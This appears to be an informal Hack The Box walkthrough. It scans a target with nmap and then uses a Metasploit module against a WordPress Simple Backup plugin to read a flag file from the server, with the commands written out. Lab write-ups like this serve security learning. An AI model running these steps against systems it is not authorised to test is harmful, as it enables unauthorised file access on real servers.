	
When we are given an IP with a port to agilize the scan with Nmap we can specify the port
this is done using the command 

$sudo nmap -sC -sV -p{PORT} {IP}

After we have done this maybe we can find a server or a site 
first we navigate to the IP adress specifying the port in the next way 

/: -> this means the search bar in a browser

/:{IP}:{PORT}

And then we can begin gathering information about the target 
In the use case of HTB it was a Wordpress site blog about the use of Simple Backup Plugin 
So in this case begin the metasploit console using 
$>> -> this means msfconsole


$>>msfconsole 

and then search for exploits about this plugin or in other data bases

$search exploit Simple Backup Plugin 

Then if a exploit is founded which is the case , call the exploit writing is number 

$>>use {NUMBER} for this exploit the number is 0 so this is 
$use 0

then given the IP and PORT declare it in the options 

$>>options 
$>>set RHOSTS {IP}
$>>set RPORT {PORT}
then exploit using 
$>>run   and also you can use $>>exploit
the file is going to be saved in your ~/user/.msf4/loot directory 

And for this challenge the PATH to a file was specified so it is necessary to declare the path as well 
$>>set FILEPATH ./flag.txt
and again exploit 
$>>exploit 
and $cat the contents of the file
